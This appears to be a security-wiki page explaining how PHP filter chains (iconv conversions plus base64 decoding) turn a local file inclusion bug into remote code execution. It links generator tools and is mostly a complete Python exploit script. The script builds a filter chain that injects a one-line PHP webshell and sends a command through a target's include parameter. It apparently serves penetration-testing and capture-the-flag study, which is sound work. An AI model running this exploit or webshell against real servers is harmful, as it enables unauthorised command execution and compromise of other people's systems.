# LFI2RCE via PHP Filters - Technique and Script

## Intro

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.

Basically the goal of the script is to **generate a Base64** string at the **beginning** of the file that will be **finally decoded** providing the desired payload that will be **interpreted by `include`**.

The bases to do this are:

- `convert.iconv.UTF8.CSISO2022KR` will always prepend `\x1b$)C` to the string
- `convert.base64-decode` is extremely tolerant, it will basically just ignore any characters that aren't valid base64. It gives some problems if it finds unexpected "=" but those can be removed with the `convert.iconv.UTF8.UTF7` filter.

The loop to generate arbitrary content is:

1. prepend `\x1b$)C` to our string as described above
2. apply some chain of iconv conversions that leaves our initial base64 intact and converts the part we just prepended to some string where the only valid base64 char is the next part of our base64-encoded php code
3. base64-decode and base64-encode the string which will remove any garbage in between
4. Go back to 1 if the base64 we want to construct isn't finished yet
5. base64-decode to get our php code

> [!WARNING]
> **Includes** usually do things like **appending ".php" at the end** of the file, which could diffecult the exploitation of this because you would need to find a .php file with a content that does't kill the exploit... or you **could just use `php://temp` as resource** because it can **have anything appended in the name** (lie +".php") and it will still allow the exploit to work!

## How to add also suffixes to the resulting data

[**This writeup explains**](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix) how you can still abuse PHP filters to add suffixes to the resulting string. This is great in case you need the output to have some specific format (like json or maybe adding some PNG magic bytes)

## Automatic Tools

- [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
- [**https://github.com/ambionics/wrapwrap**](https://github.com/ambionics/wrapwrap) **(can add suffixes)**
- [https://github.com/ambionics/lightyear](https://github.com/ambionics/lightyear) (blind file-dump oracle with digit-set jumps)

## Full script

```python
import requests

url = "http://localhost/index.php"
file_to_use = "php://temp"
command = "/readflag"

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={
    "0": command,
    "action": "include",
    "file": final_payload
})

print(r.text)
```
